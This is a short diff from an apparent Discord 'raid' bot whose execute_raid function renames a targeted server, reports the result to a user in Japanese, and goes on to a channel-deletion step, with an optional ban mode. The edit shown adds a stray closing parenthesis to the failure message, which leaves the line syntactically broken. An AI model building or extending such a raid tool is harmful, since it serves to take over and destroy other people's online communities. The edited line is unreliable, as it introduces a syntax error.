@@ -173,7 +173,7 @@ async def execute_raid(ctx, do_ban=False):
             await guild.edit(name=new_server_name)
         await user.send('サーバー設定変更完了')
     except Exception as e:
-        await user.send('サーバー設定変更失敗')
+        await user.send('サーバー設定変更失敗'))
 
     # 7. チャンネル削除
     try:
